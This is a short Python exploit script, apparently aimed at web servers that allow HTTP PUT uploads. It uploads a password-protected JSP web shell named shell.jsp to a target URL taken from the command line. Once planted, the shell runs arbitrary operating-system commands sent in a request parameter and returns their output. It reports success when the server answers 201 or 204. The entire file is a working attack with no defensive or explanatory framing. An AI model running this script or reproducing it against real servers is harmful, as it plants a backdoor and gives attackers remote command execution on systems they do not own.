#-*-coding:utf-8-*-
import requests
import sys

def main(param):
    result = {
        "success": False,
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    payload = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
    +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
    url = url + '/shell.jsp/'
    Re = requests.put(url, data=payload)
    status = Re.status_code
    if status==201 or status==204:
        result['success'] = True
        result['url'] = url
        return result
    else:
        return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)
